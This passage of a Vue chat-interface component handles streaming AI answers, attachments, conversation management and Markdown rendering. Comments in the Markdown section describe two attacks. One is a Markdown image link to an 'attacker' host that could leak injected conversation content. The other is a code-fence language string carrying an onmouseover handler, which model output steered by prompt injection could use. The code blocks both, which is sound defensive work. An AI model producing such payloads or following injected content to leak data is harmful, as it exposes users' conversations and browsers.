    // 先插一条空的 AI 消息，收到增量就往里追加 —— 首字到达即渲染，不用等整段生成完
    const startIdx = (convMessages.value[convId] || []).length
    convMessages.value[convId] = [...(convMessages.value[convId] || []), {
      role: 'ai', content: '', sources: [], mode: mode.value, streaming: true, reasoning: ''
    }]
    let lastScroll = 0
    const patch = (fn) => {
      const arr = convMessages.value[convId]
      if (!arr || !arr[startIdx]) return
      fn(arr[startIdx])
      convMessages.value[convId] = [...arr]
      const now = Date.now()
      if (currentId.value === convId && now - lastScroll > 80) { lastScroll = now; scrollToBottom() }
    }

    let data
    try {
      data = await aiAskStream(question, convId, mode.value, {
        modelId: selectedModelId.value || null,
        images: images.length ? images : null,
        signal: abortCtrl.value.signal,
        onDelta: (d) => patch((m) => { m.content += d }),
        onReasoning: (r) => patch((m) => { m.reasoning = (m.reasoning || '') + r })
      })
    } catch (err) {
      // 旧后端没有 /ai/ask/stream：404 时回退到一次性接口，保证兼容
      if (err && err.status === 404) {
        const { data: fallback } = await aiAsk(question, convId, mode.value, {
          modelId: selectedModelId.value || null, signal: abortCtrl.value.signal,
          images: images.length ? images : null
        })
        data = fallback
      } else {
        throw err
      }
    }
    patch((m) => {
      m.content = data.answer || m.content || '（暂无返回内容）'
      m.sources = data.sources || []
      m.meta = buildMeta(data)
      m.streaming = false
    })
    if (currentId.value === convId) {
      const c2 = conversations.value.find((c) => c.id === convId)
      if (c2 && data.title && data.title !== c2.title) c2.title = data.title
      const idx = conversations.value.findIndex((c) => c.id === convId)
      if (idx > 0) { const [item] = conversations.value.splice(idx, 1); conversations.value.unshift(item) }
    }
  } catch (e) {
    const curErr = convMessages.value[convId] || []
    const stopped = e && (e.name === 'CanceledError' || e.code === 'ERR_CANCELED' || e.name === 'AbortError')
    const text = stopped ? '（已停止生成）' : '请求失败，请稍后重试。'
    const last = curErr[curErr.length - 1]
    if (last && last.streaming) {
      // 已经吐了部分内容就保留，只把 streaming 标记摘掉；一个字都没有才替换成提示
      if (last.content) last.streaming = false
      else curErr[curErr.length - 1] = { role: 'ai', content: text, sources: [], mode: mode.value }
      convMessages.value[convId] = [...curErr]
    } else {
      convMessages.value[convId] = [...curErr, { role: 'ai', content: text, sources: [], mode: mode.value }]
    }
  } finally {
    abortCtrl.value = null
    loadingSet.value.delete(convId)
    if (currentId.value === convId) scrollToBottom()
  }
}

async function regenerate() {
  if (loading.value) return
  const arr = convMessages.value[currentId.value] || []
  let ui = -1
  for (let i = arr.length - 1; i >= 0; i--) { if (arr[i].role === 'user') { ui = i; break } }
  if (ui < 0) return
  const lastQ = arr[ui].content
  const convId = currentId.value

  loadingSet.value.add(convId)
  await nextTick()
  try {
    abortCtrl.value = new AbortController()
    const { data } = await aiAsk(lastQ, convId, mode.value, {
      modelId: selectedModelId.value || null, signal: abortCtrl.value.signal
    })
    const newArr = [...arr]
    const aiMsg = {
      role: 'ai', content: data.answer || '（暂无返回内容）',
      sources: data.sources || [], mode: mode.value, meta: buildMeta(data)
    }
    if (newArr[ui + 1] && newArr[ui + 1].role === 'ai') newArr[ui + 1] = aiMsg
    else newArr.splice(ui + 1, 0, aiMsg)
    convMessages.value[convId] = newArr
  } catch (e) {
    const stopped = e && (e.name === 'CanceledError' || e.code === 'ERR_CANCELED')
    if (!stopped) ElMessage.error('重新生成失败，请稍后重试')
  } finally {
    abortCtrl.value = null
    loadingSet.value.delete(convId)
    if (currentId.value === convId) scrollToBottom()
  }
}

async function removeConversation(id, e) {
  e?.stopPropagation()
  try {
    await ElMessageBox.confirm('确定删除这条会话及其历史消息吗？', '删除会话', { type: 'warning' })
    await deleteConversation(id)
    conversations.value = conversations.value.filter((c) => c.id !== id)
    delete convMessages.value[id]
    if (currentId.value === id) { currentId.value = null; localStorage.removeItem(STORAGE_KEY) }
    ElMessage.success('已删除')
  } catch (e) {
    if (e !== 'cancel') ElMessage.error('删除失败')
  }
}

// ---------- 批量删除会话 ----------
const batchMode = ref(false)
const selectedIds = ref([])

function toggleBatchMode() {
  batchMode.value = !batchMode.value
  selectedIds.value = []
}

function isSelected(id) {
  return selectedIds.value.includes(id)
}

function toggleSelect(id) {
  const i = selectedIds.value.indexOf(id)
  if (i >= 0) selectedIds.value.splice(i, 1)
  else selectedIds.value.push(id)
}

function selectAllConvs() {
  selectedIds.value = selectedIds.value.length === conversations.value.length
    ? []
    : conversations.value.map((c) => c.id)
}

async function removeSelectedConvs() {
  const ids = [...selectedIds.value]
  if (!ids.length) return
  try {
    await ElMessageBox.confirm(
      `确定删除选中的 ${ids.length} 个会话？删除后聊天记录无法恢复。`,
      '批量删除', { type: 'warning', confirmButtonText: '删除', cancelButtonText: '取消' }
    )
  } catch { return }
  try {
    await batchDeleteConversations(ids)
    const gone = new Set(ids.map(String))
    conversations.value = conversations.value.filter((c) => !gone.has(String(c.id)))
    ids.forEach((id) => { delete convMessages.value[id] })
    // 当前正在看的会话被删掉了 → 切到剩下的第一条，别停在空白页
    if (ids.some((id) => String(id) === String(currentId.value))) {
      currentId.value = conversations.value[0]?.id ?? null
      if (currentId.value == null) localStorage.removeItem(STORAGE_KEY)
    }
    ElMessage.success(`已删除 ${ids.length} 个会话`)
    batchMode.value = false
    selectedIds.value = []
  } catch (e) {
    ElMessage.error('批量删除失败：' + ((e && e.message) || e))
  }
}

function startRename(c, e) {
  e?.stopPropagation()
  renamingId.value = c.id
  renameTitle.value = c.title
  nextTick(() => { const el = document.querySelector('.conv-rename-input input'); el?.focus(); el?.select() })
}
async function submitRename(c) {
  const title = renameTitle.value.trim()
  if (!title || title === c.title) { renamingId.value = null; return }
  try { await updateConversation(c.id, { title }); c.title = title; ElMessage.success('已重命名') }
  catch { ElMessage.error('重命名失败') } finally { renamingId.value = null }
}

function openInstructions(c) {
  instructionsForm.value = { id: c.id, title: c.title, instructions: c.instructions || '' }
  showInstructionsDrawer.value = true
}
async function submitInstructions() {
  const { id, title, instructions } = instructionsForm.value
  savingInstructions.value = true
  try {
    const { data } = await updateConversation(id, { title, instructions })
    const conv = conversations.value.find((c) => c.id === id)
    if (conv) { conv.title = data.title; conv.instructions = data.instructions }
    showInstructionsDrawer.value = false
    ElMessage.success('已保存')
  } catch { ElMessage.error('保存失败') } finally { savingInstructions.value = false }
}

function openSource(id) { if (id != null) window.open('/reader/' + id, '_blank') }
// ---------- 附件：本地解析（图片走内置 OCR、文本文件直读），随提问注入 ----------
function pickFiles() { fileInput.value?.click() }

function removeAttachment(id) {
  attachments.value = attachments.value.filter((a) => a.id !== id)
}

/** 图片附件切换处理方式：看图（多模态）⇄ 识文字（本地 OCR，离线可用） */
function toggleAttMode(id) {
  const a = attachments.value.find((x) => x.id === id)
  if (a && a.kind === 'image') a.mode = a.mode === 'vision' ? 'ocr' : 'vision'
}

async function onFilesPicked(e) {
  const list = Array.from(e.target.files || [])
  e.target.value = ''
  if (!list.length || attBusy.value) return
  attBusy.value = true
  for (const f of list) {
    if (attachments.value.length >= 4) { ElMessage.warning('一次最多带 4 个附件'); break }
    const isDoc = DOC_EXTS.test(f.name)
    const sizeLimit = isDoc ? 20 * 1024 * 1024 : 8 * 1024 * 1024
    if (f.size > sizeLimit) { ElMessage.warning('「' + f.name + '」超过 ' + (isDoc ? 20 : 8) + 'MB，已跳过'); continue }
    try {
      let text = ''
      let kind = 'text'
      if (/^image\//i.test(f.type)) {
        // 图片：默认「看图」——压缩后多模态直接交给模型（图案/排版都能识别）；
        // 也可在附件 chip 上切「识文字」用本地 OCR 提取文字（离线可用）。
        const dataUrl = await compressImage(f)
        const safeName = f.name.replace(/[\r\n\u0000-\u001f]/g, ' ')
      attachments.value = [...attachments.value, {
          id: Date.now() + '-' + Math.random().toString(36).slice(2, 7),
          name: f.name, size: f.size, kind: 'image', dataUrl, text: '', file: f, mode: 'vision'
        }]
        continue
      } else if (isDoc) {
        // PDF / Word / PPT / Excel：本地解析成文本（PDF 扫描件页自动转图走多模态）
        ElMessage.info('正在解析「' + f.name + '」…')
        const r = await parseDocument(f)
        const txt = (r && r.text ? r.text : '').trim()
        if (txt) {
          attachments.value = [...attachments.value, {
            id: Date.now() + '-' + Math.random().toString(36).slice(2, 7),
            name: f.name, size: f.size, kind: 'text',
            text: txt.slice(0, ATT_SNIPPET) + (txt.length > ATT_SNIPPET ? '\n…（内容过长已截断）' : '')
          }]
        }
        const imgs = (r && r.images) || []
        for (let i = 0; i < Math.min(imgs.length, 2); i++) {
          if (attachments.value.length >= 4) break
          attachments.value = [...attachments.value, {
            id: Date.now() + '-p' + i + '-' + Math.random().toString(36).slice(2, 7),
            name: f.name + ' 第' + (i + 1) + '页', size: 0, kind: 'image', dataUrl: imgs[i], text: '', mode: 'vision'
          }]
        }
        if (!txt && !imgs.length) ElMessage.warning('「' + f.name + '」没解析出内容')
        continue
      } else if (/\.(txt|md|markdown|json|csv|log|xml|yml|yaml|sql|ts|js|mjs|py|java|html?|css|vue|ini|conf|properties)$/i.test(f.name) || /^text\//i.test(f.type || '')) {
        if (f.size > ATT_TEXT_MAX) { ElMessage.warning('「' + f.name + '」超过 200KB，已跳过'); continue }
        kind = 'text'
        text = await new Promise((res, rej) => {
          const r = new FileReader()
          r.onload = () => res(String(r.result || ''))
          r.onerror = () => rej(new Error('读取失败'))
          r.readAsText(f, 'utf-8')
        })
      } else {
        ElMessage.warning('「' + f.name + '」暂不支持（支持图片、PDF、Word/PPT/Excel、文本类文件）')
        continue
      }
      attachments.value = [...attachments.value, {
        id: Date.now() + '-' + Math.random().toString(36).slice(2, 7),
        name: f.name, size: f.size, kind,
        text: text.slice(0, ATT_SNIPPET) + (text.length > ATT_SNIPPET ? '\n…（内容过长已截断）' : '')
      }]
    } catch (err) {
      ElMessage.error('解析「' + f.name + '」失败：' + ((err && err.message) || err))
    }
  }
  attBusy.value = false
}

/** 把文本类内容（文本文件 + 「识文字」的图片）拼进提问；「看图」的图片由 images 走多模态 */
function buildQuestionWithAttachments(q) {
  const texts = attachments.value.filter((a) => a.text)
  if (!texts.length) return q
  const parts = texts.map((a, i) =>
    '【附件 ' + (i + 1) + '：' + a.name + (a.kind === 'image' ? ' · 本地识别文字】' : '】') + '\n' + a.text)
  return parts.join('\n\n') + '\n\n【提问】' + q
}
async function copyAnswer(m) {
  try { await navigator.clipboard.writeText(m.content); ElMessage.success('已复制') }
  catch { ElMessage.warning('复制失败，请手动选择') }
}

// ---------- Markdown（markdown-it + Prism 语法高亮，均在 node_modules，无需额外安装） ----------
// html:false 防 XSS（AI 输出按纯文本解析）；linkify 自动识别裸链接；breaks 单换行即 <br> 贴合聊天排版
const md = new MarkdownIt({ html: false, linkify: true, breaks: true })
// 外部图片不自动加载：markdown 的 ![](https://attacker/log?d=...) 会被浏览器自动请求，
// 被注入的对话内容可能借此外泄（外部复审 2026-10-07）。只放行本站 /uploads /emojis，
// 其余降级为纯文本链接（点击才会访问）。
const LOCAL_IMG_RE = /^\/(uploads|emojis)\//i
const defaultRenderImage = md.renderer.rules.image
md.renderer.rules.image = (tokens, idx, opts, env, self) => {
  const src = tokens[idx].attrGet('src') || ''
  if (LOCAL_IMG_RE.test(src) || /^(data:image\/(png|jpe?g|gif|webp|bmp);base64,)/i.test(src)) {
    return defaultRenderImage(tokens, idx, opts, env, self)
  }
  const href = md.utils.escapeHtml(src)
  return '<a href="' + href + '" target="_blank" rel="noopener noreferrer">[外部图片，点击查看]</a>'
}

// 代码块保留原 .md-code-block / .md-copy-btn / .md-code 结构，复用既有复制逻辑与样式；指定语言时用 Prism 上色
function highlightCode(code, lang) {
  const l = (lang || '').toLowerCase()
  if (l && Prism.languages[l]) {
    try { return Prism.highlight(code, Prism.languages[l], l) } catch (e) { /* 语言不可用则回退纯文本 */ }
  }
  return md.utils.escapeHtml(code)
}
md.renderer.rules.fence = (tokens, idx) => {
  const info = (tokens[idx].info || '').trim()
  // 语言标识进 class 前必须做字符白名单（审查 r9 Critical / r10 复现）：
  // 模型输出（可被检索内容提示注入）写 ```x" onmouseover=... 即可闭合属性注入事件处理器
  const lang = info ? info.toLowerCase().split(/[\s,;:]/)[0].replace(/[^a-z0-9_+#.-]/g, '') : ''
  const cls = lang ? ' language-' + lang : ''
  const code = highlightCode(tokens[idx].content, lang)
  return '<div class="md-code-block"><button type="button" class="md-copy-btn">复制</button>'
    + '<pre class="md-code' + cls + '"><code' + cls + '>' + code + '</code></pre></div>'
}
function renderMarkdown(src) {
  if (!src) return ''
  return md.render(src)
}
function onBodyClick(e) {
  const btn = e.target.closest?.('.md-copy-btn')
  if (!btn) return
  const codeEl = btn.parentElement?.querySelector('code')
  const text = codeEl?.innerText || ''
  navigator.clipboard.writeText(text).then(() => {
    const old = btn.textContent; btn.textContent = '已复制'
    setTimeout(() => { btn.textContent = old }, 1200)
  }).catch(() => ElMessage.warning('复制失败'))
}

function onKey(e) {
  if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); send() }
}

onMounted(async () => {
  // 支持 /ai/chat?mode=agent 直达对应模式（「我的测验 → 让 AI 出题」就用这个）
  const qm = String(route.query.mode || '').toLowerCase()
  if (['kb', 'general', 'agent'].includes(qm)) mode.value = qm
  loadAiGuard()
  // 窄屏判定：与 CSS 断点保持一致（≤1024 侧栏变抽屉）
  mqNarrow = window.matchMedia('(max-width: 1024px)')
  isNarrow.value = mqNarrow.matches
  mqNarrow.addEventListener('change', onNarrowChange)

  bodyRef.value?.addEventListener('scroll', onBodyScroll)
  bodyRef.value?.addEventListener('click', onBodyClick)
  // 先拉可用模型，头部下拉与发送时的 modelId 都依赖它
  await loadModels()
  loadCtxWindow()   // 模型拿到后才能按 id 恢复用户调过的上下文窗口
  await loadConversations()
  const saved = localStorage.getItem(STORAGE_KEY)
  if (saved && conversations.value.some((c) => String(c.id) === saved)) {
    currentId.value = Number(saved)
    await loadMessages(currentId.value)
  } else if (conversations.value.length > 0) {
    currentId.value = conversations.value[0].id
    localStorage.setItem(STORAGE_KEY, String(currentId.value))
    await loadMessages(currentId.value)
  } else {
    currentId.value = null
    localStorage.removeItem(STORAGE_KEY)
  }
})

onBeforeUnmount(() => {
  if (mqNarrow) mqNarrow.removeEventListener('change', onNarrowChange)
  bodyRef.value?.removeEventListener('scroll', onBodyScroll)
  bodyRef.value?.removeEventListener('click', onBodyClick)
})

watch(currentId, (id) => { if (id) localStorage.setItem(STORAGE_KEY, String(id)) })
</script>

<template>
  <div class="ai-layout">
    <!-- ===== 侧栏 ===== -->
    <aside
      class="ai-sidebar"
      :class="{
        collapsed: !isNarrow && sidebarCollapsed,
        'is-drawer': isNarrow,
        'drawer-open': isNarrow && drawerOpen,
      }"
    >
      <div class="ai-sidebar-inner">
      <div class="ai-sidebar-head">
        <button type="button" class="ai-newchat" :disabled="creating" @click="newConversation">
          <el-icon><Plus /></el-icon><span>新建对话</span>
        </button>
      </div>
      <div class="ai-conv-head">
        <span>历史会话</span>
        <div class="conv-head-acts">
          <template v-if="batchMode">
            <button type="button" class="conv-mini" @click="selectAllConvs">
              {{ selectedIds.length === conversations.length && conversations.length ? '取消全选' : '全选' }}
            </button>
            <button type="button" class="conv-mini danger" :disabled="!selectedIds.length" @click="removeSelectedConvs">
              删除{{ selectedIds.length ? `(${selectedIds.length})` : '' }}
            </button>
            <button type="button" class="conv-mini" @click="toggleBatchMode">取消</button>
          </template>
          <button v-else type="button" class="conv-mini" :disabled="!conversations.length"
            title="批量删除会话" @click="toggleBatchMode">批量</button>
        </div>
      </div>
      <div v-loading="loadingConversations" class="ai-conv-list">
        <TransitionGroup name="conv" tag="div" class="ai-conv-inner">
          <div
            v-for="c in conversations"
            :key="c.id"
            class="ai-conv-item"
            :class="{ active: currentId === c.id && !batchMode, selected: batchMode && isSelected(c.id) }"
            @click="batchMode ? toggleSelect(c.id) : selectConversation(c.id)"
          >
            <el-icon v-if="batchMode" class="ai-conv-check" :class="{ on: isSelected(c.id) }">
              <Select />
            </el-icon>
            <el-icon v-else class="ai-conv-icon"><ChatLineRound /></el-icon>
            <div class="ai-conv-main">
              <div v-if="renamingId === c.id" class="ai-conv-title" @click.stop>
                <el-input v-model="renameTitle" size="small" class="conv-rename-input"
                  @blur="submitRename(c)" @keydown.enter="submitRename(c)" />
              </div>
              <div v-else class="ai-conv-title" :title="c.title">{{ c.title }}</div>
              <div class="ai-conv-meta">{{ c.updatedAt?.replace('T',' ')?.slice(0,16) || '' }}</div>
            </div>
            <div v-if="!batchMode" class="ai-conv-actions" @click.stop>
              <el-button text :icon="Document" title="对话条例" @click="openInstructions(c)" />
              <el-button text :icon="EditPen" title="重命名" @click="startRename(c, $event)" />
              <el-button text :icon="Delete" title="删除" @click="removeConversation(c.id, $event)" />
            </div>
          </div>
        </TransitionGroup>
        <div v-if="conversations.length === 0 && !loadingConversations" class="ai-conv-empty">
          暂无历史会话<br>点击上方“新建对话”开始提问
        </div>
      </div>
      </div>
    </aside>

    <!-- 窄屏抽屉遮罩：点击任意处收起侧栏 -->
    <div v-if="isNarrow && drawerOpen" class="ai-side-mask" @click="drawerOpen = false"></div>

    <!-- ===== 主区 ===== -->
    <div class="ai-page">
      <div class="ai-head">
        <div class="ai-head-left">
          <el-tooltip :content="sideToggleTip" placement="bottom" :show-after="200">
            <button type="button" class="ai-side-toggle" @click="toggleSidebar">
              <el-icon v-if="isNarrow ? !drawerOpen : sidebarCollapsed"><Expand /></el-icon>
              <el-icon v-else><Fold /></el-icon>
            </button>
          </el-tooltip>
          <div class="ai-head-info">
            <div class="ai-title">{{ currentConversation?.title || 'AI 智能问答' }}</div>
            <div class="ai-sub">{{ mode === 'agent' ? 'Agent 模式 · 自主检索 / 写文档 / 改文档' : (mode === 'general' ? '通用模式 · 直接作答' : '基于知识库作答 · 库里没有也能通用问答') }}</div>
          </div>
        </div>

      </div>

      <div class="ai-body" ref="bodyRef" v-loading="loadingMessages">
        <!-- 空状态 -->
        <div v-if="!started && !loadingMessages" key="empty" class="ai-empty">
          <div class="ai-orb">
            <svg class="ai-orb-mark" viewBox="0 0 24 24" aria-hidden="true">
              <path d="M12 2 C12 8 8 12 2 12 C8 12 12 16 12 22 C12 16 16 12 22 12 C16 12 12 8 12 2 Z" fill="#fff"/>
            </svg>
          </div>
          <h2 class="ai-empty-title">{{ emptyCopy.title }}</h2>
          <p class="ai-empty-tip">{{ emptyCopy.tip }}</p>
          <div class="ai-features">
            <span v-for="f in emptyCopy.features" :key="f.text" class="ai-feature">
              <el-icon><Reading v-if="f.icon === 'Reading'" /><EditPen v-else-if="f.icon === 'EditPen'" /><Cpu v-else-if="f.icon === 'Cpu'" /><ChatDotRound v-else /></el-icon>{{ f.text }}
            </span>
          </div>
          <div class="ai-sugs">
            <button v-for="s in emptyCopy.sugs" :key="s" class="ai-sug" type="button" @click="send(s)">{{ s }}</button>
          </div>
          <p class="ai-disclaimer">内容由 AI 生成，仅供参考</p>
        </div>

        <!-- 消息流（直接渲染，无外层 Transition，避免切换抖动） -->
        <div v-else class="ai-msgs">
          <template v-for="(m, i) in messages" :key="currentId + ':' + i">
            <!-- 用户：消息气泡在左，头像在右，整行右对齐 -->
            <div v-if="m.role === 'user'" class="ai-msg user">
              <div class="ai-bubble user-bubble">
                <div v-if="m.files && m.files.length" class="ai-files">
                  <span v-for="f in m.files" :key="f" class="ai-file-chip">📎 {{ f }}</span>
                </div>
                <div v-html="escapeHtml(m.content)"></div>
              </div>
              <div class="ai-avatar user-av" :style="{ background: userGradient }">
                <img v-if="userAvatar" :src="userAvatar" alt="" />
                <span v-else>{{ userInitial }}</span>
              </div>
            </div>

            <!-- AI：左对齐，自定义 sparkle 头像 -->
            <div v-else class="ai-msg ai">
              <div class="ai-avatar ai-av">
                <svg class="ai-av-mark" viewBox="0 0 24 24" aria-hidden="true">
                  <path d="M12 2 C12 8 8 12 2 12 C8 12 12 16 12 22 C12 16 16 12 22 12 C16 12 12 8 12 2 Z" fill="#fff"/>
                </svg>
              </div>
              <div class="ai-col">
                <div class="ai-name-row">
                  <span class="ai-name">{{ m.mode === 'agent' ? 'Agent' : '知识库 AI' }}</span>
                  <span class="ai-mode-chip">{{ m.mode === 'agent' ? 'Agent 执行' : (m.mode === 'general' ? '通用问答' : '基于知识库') }}</span>
                </div>
                <!-- 思考过程：思考型模型才有，默认折叠（历史回答不保留） -->
                <details v-if="m.meta && m.meta.reasoning" class="ai-reasoning">
                  <summary>💭 思考过程（{{ m.meta.reasoning.length }} 字）</summary>
                  <div class="ai-reasoning-body">{{ m.meta.reasoning }}</div>
                </details>
                <div v-if="m.steps && m.steps.length" class="ai-agent-steps msg-steps">
                  <div class="ai-agent-head" @click="msgStepsOpen[i] = !msgStepsOpen[i]">
                    <span>执行过程（{{ m.steps.length }} 步）</span>
                    <span class="ai-agent-toggle">{{ msgStepsOpen[i] ? '收起' : '展开' }}</span>
                  </div>
                  <div v-show="msgStepsOpen[i]" class="ai-agent-list">
                    <div v-for="(st, si) in m.steps" :key="si" class="ai-agent-step">
                      <span class="ai-agent-dot"></span>{{ st }}
                    </div>
                  </div>
                </div>
                <div class="ai-flat" v-html="renderMarkdown(m.content)"></div>

                <div v-if="m.sources && m.sources.length" class="ai-sources">
                  <div class="ai-sources-head">
                    <el-icon><Link /></el-icon>
                    <span>引用来源（{{ m.sources.length }}）</span>
                  </div>
                  <div class="ai-source-list">
                    <button v-for="(s, si) in m.sources" :key="si" type="button" class="ai-source"
                      :title="s.id != null ? '点击在新窗口阅读' : ''" @click="openSource(s.id)">
                      <span class="ai-source-title">{{ s.title }}</span>
                      <span class="ai-source-snippet">{{ s.snippet }}</span>
                    </button>
                  </div>
                </div>
                <!-- 检索未命中：明确告知「查过知识库但没找到」，把这种回答和「引用了资料」区分开。
                     否则答案看上去和引用资料时一模一样，用户无法判断它到底有没有依据知识库。 -->
                <div v-else-if="m.mode !== 'general'" class="ai-no-source">
                  <el-icon><Search /></el-icon>
                  <span>已检索知识库，未命中相关内容</span>
                </div>

                <!-- 调用可视化：本次实际用的模型、耗时、token 用量 -->
                <div v-if="m.meta" class="ai-meta">
                  <span v-if="m.meta.name" class="ai-meta-chip">
                    <el-icon><Cpu /></el-icon>{{ m.meta.name }}
                  </span>
                  <span v-if="m.meta.latencyMs" class="ai-meta-chip">{{ fmtMs(m.meta.latencyMs) }}</span>
                  <span v-if="fmtTokens(m.meta.usage)" class="ai-meta-chip">
                    {{ fmtTokens(m.meta.usage) }}
                  </span>
                </div>

                <div class="ai-actions">
                  <el-tooltip content="复制" placement="top" :show-after="200">
                    <button type="button" class="ai-icon-btn" @click="copyAnswer(m)"><el-icon><CopyDocument /></el-icon></button>
                  </el-tooltip>
                  <el-tooltip content="重新生成" placement="top" :show-after="200">
                    <button type="button" class="ai-icon-btn" :disabled="loading" @click="regenerate"><el-icon><Refresh /></el-icon></button>
                  </el-tooltip>
                </div>
              </div>
            </div>
          </template>

          <div v-if="loading" class="ai-msg ai">
            <div class="ai-avatar ai-av">
              <svg class="ai-av-mark" viewBox="0 0 24 24" aria-hidden="true">
                <path d="M12 2 C12 8 8 12 2 12 C8 12 12 16 12 22 C12 16 16 12 22 12 C16 12 12 8 12 2 Z" fill="#fff"/>
              </svg>
            </div>
            <div class="ai-col">
              <div class="ai-typing"><span></span><span></span><span></span></div>
              <!-- Agent 模式：步骤可折叠（执行中展开看进度，完成后自动收起，避免刷屏） -->
              <div v-if="agentSteps.length" class="ai-agent-steps">
                <div class="ai-agent-head" @click="agentStepsOpen = !agentStepsOpen">
                  <span>执行过程（{{ agentSteps.length }} 步）</span>
                  <span class="ai-agent-toggle">{{ agentStepsOpen ? '收起' : '展开' }}</span>
                </div>
                <div v-show="agentStepsOpen" class="ai-agent-list">
                  <div v-for="(s, i) in agentSteps" :key="i" class="ai-agent-step">
                    <span class="ai-agent-dot"></span>{{ s }}
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        <transition name="fade">
          <button v-if="showScrollBtn && started" type="button" class="ai-tobottom" @click="scrollToBottom" title="回到底部">
            <el-icon><ArrowDown /></el-icon>
          </button>
        </transition>
      </div>

      <!-- 输入栏 -->
      <div class="ai-input-wrap">
        <div class="ai-input-card">
          <input ref="fileInput" type="file" multiple hidden
            accept="image/*,.pdf,.docx,.pptx,.xlsx,.txt,.md,.markdown,.json,.csv,.log,.xml,.yml,.yaml,.sql,.ts,.js,.py,.java,.html,.css,.vue,.ini,.conf,.properties"
            @change="onFilesPicked" />
          <div v-if="attachments.length" class="ai-atts">
            <span v-for="a in attachments" :key="a.id" class="ai-att" :title="a.name">
              {{ a.kind === 'image' ? (a.mode === 'vision' ? '🖼' : '📝') : '📄' }} {{ a.name.length > 14 ? a.name.slice(0, 13) + '…' : a.name }}
              <button v-if="a.kind === 'image'" type="button" class="ai-att-mode"
                :title="a.mode === 'vision' ? '当前：直接给模型看图。点击改为本地 OCR 识别文字（离线可用）' : '当前：本地 OCR 识别文字。点击改回直接看图'"
                @click="toggleAttMode(a.id)">{{ a.mode === 'vision' ? '看图' : '识文' }}</button>
              <button type="button" class="ai-att-x" @click="removeAttachment(a.id)">×</button>
            </span>
          </div>
          <textarea v-model="input" class="ai-text" rows="2"
            placeholder="输入你的问题，Enter 发送，Shift + Enter 换行" @keydown="onKey"></textarea>
          <div class="ai-input-bar">
            <div class="ai-mode" role="tablist" aria-label="回答模式">
              <span class="ai-mode-thumb" :style="thumbStyle"></span>
              <button type="button" class="ai-mode-btn" :class="{ active: mode === 'kb' }"
                title="仅依据知识库内容作答" @click="mode = 'kb'">
                <el-icon><Reading /></el-icon><span>知识库</span>
              </button>
              <button type="button" class="ai-mode-btn" :class="{ active: mode === 'general' }"
                title="不检索知识库，进行通用问答" @click="mode = 'general'">
                <el-icon><ChatDotRound /></el-icon><span>通用</span>
              </button>
              <button type="button" class="ai-mode-btn" :class="{ active: mode === 'agent' }"
                title="Agent：自主检索资料、写文档、改文档（会真正操作你的知识库）" @click="mode = 'agent'">
                <el-icon><Cpu /></el-icon><span>Agent</span>
              </button>
            </div>
            <div class="ai-input-right">
              <el-tooltip content="上传文件（图片 OCR / 文本类）" placement="top" :show-after="300">
                <button type="button" class="ai-round-btn ghost" @click="pickFiles" :disabled="attBusy"><el-icon><Paperclip /></el-icon></button>
              </el-tooltip>
              <div class="ai-input-tools">
              <!-- 上下文用量环：点开可以看明细、切思考强度、压缩历史 -->
              <el-popover placement="top-end" :width="304" trigger="click"
                          popper-class="ai-ctx-pop" :show-arrow="false" :offset="8">
                <template #reference>
                  <button type="button" class="ai-ctx"
                          :title="`上下文 ${formatTokens(usedTokens)} / ${formatTokens(ctxWindow)}（${ctxPct}%）`">
                    <svg viewBox="0 0 36 36" class="ai-ctx-ring" aria-hidden="true">
                      <circle cx="18" cy="18" r="15.5" class="ai-ctx-bg" />
                      <circle cx="18" cy="18" r="15.5" class="ai-ctx-fg"
                              :stroke="ctxColor" :stroke-dasharray="ctxRing" />
                    </svg>
                    <span class="ai-ctx-num">{{ ctxPct }}</span>
                  </button>
                </template>
                <div class="ctxp">
                  <div class="ctxp-head">
                    <span>上下文用量</span>
                    <b :style="{ color: ctxColor }">{{ ctxPct }}%</b>
                  </div>
                  <div class="ctxp-bar seg">
                    <i v-for="p in ctxParts" :key="p.name"
                       :style="{ width: (p.value / ctxWindow) * 100 + '%', background: p.color }"></i>
                  </div>
                  <div v-for="p in ctxParts" :key="p.name" class="ctxp-row">
                    <span class="ctxp-k"><i class="ctxp-dot" :style="{ background: p.color }"></i>{{ p.name }}</span>
                    <b>{{ formatTokens(p.value) }}</b>
                  </div>
                  <div class="ctxp-foot">
                    <span>窗口 {{ formatTokens(ctxWindow) }} · {{ effectiveModel?.name || '默认模型' }} · {{ activeMessages.length }} 条消息</span>
                  </div>

                  <div class="ctxp-sec">上下文窗口</div>
                  <el-slider
                    :model-value="ctxWindow" :min="8000" :max="modelMaxWindow" :step="1000"
                    :show-tooltip="false" class="ctxp-slider"
                    @update:model-value="(v) => { ctxWindowSet = v; saveCtxWindow() }" />
                  <div class="ctxp-slider-label">
                    <span><b>{{ formatTokens(ctxWindow) }}</b> 上下文 · {{ ctxWindowLabel }}</span>
                    <button v-if="ctxWindowSet > 0" type="button" class="ctxp-reset"
                            @click="ctxWindowSet = 0; saveCtxWindow()">恢复上限</button>
                  </div>

                  <div class="ctxp-sec">思考强度</div>
                  <div class="ctxp-think">
                    <button v-for="t in THINK_LEVELS" :key="t.value" type="button"
                            class="ctxp-tbtn" :class="{ on: think === t.value }" :title="t.tip"
                            @click="think = t.value">{{ t.label }}</button>
                  </div>

                  <div class="ctxp-sec">压缩上下文</div>
                  <button type="button" class="ctxp-act" :disabled="compacting" @click="compactContext">
                    {{ compacting ? '压缩中…' : '把历史压成摘要' }}
                  </button>
                  <p class="ctxp-tip">保留目标、结果和未完成事项，细节会丢。对话很长、开始变慢或报超长时用。</p>
                </div>
              </el-popover>
              <el-popover
                v-if="modelList.length"
                placement="top-end" :width="288" trigger="click"
                popper-class="aimp-popover" :show-arrow="false" :offset="8">
                <template #reference>
                  <button type="button" class="aimp-trigger" :title="currentModel ? currentModel.name + ' · ' + currentModel.model : '使用默认模型'">
                    <ProviderLogo v-if="currentModelProvider" :provider="currentModelProvider" :size="16" />
                    <span v-else class="aimp-dot"></span>
                    <span class="aimp-label">{{ currentModelLabel }}</span>
                    <el-icon class="aimp-caret"><ArrowDown /></el-icon>
                  </button>
                </template>

                <div class="aimp-list">
                  <div class="aimp-head">选择模型</div>
                  <button type="button" class="aimp-row" :class="{ on: !selectedModelId }" @click="pickModel('')">
                    <span class="aimp-ico"><span class="aimp-dot"></span></span>
                    <span class="aimp-main">
                      <span class="aimp-name">默认模型</span>
                      <span class="aimp-sub">由管理员指定</span>
                    </span>
                    <el-icon v-if="!selectedModelId" class="aimp-check"><Select /></el-icon>
                  </button>
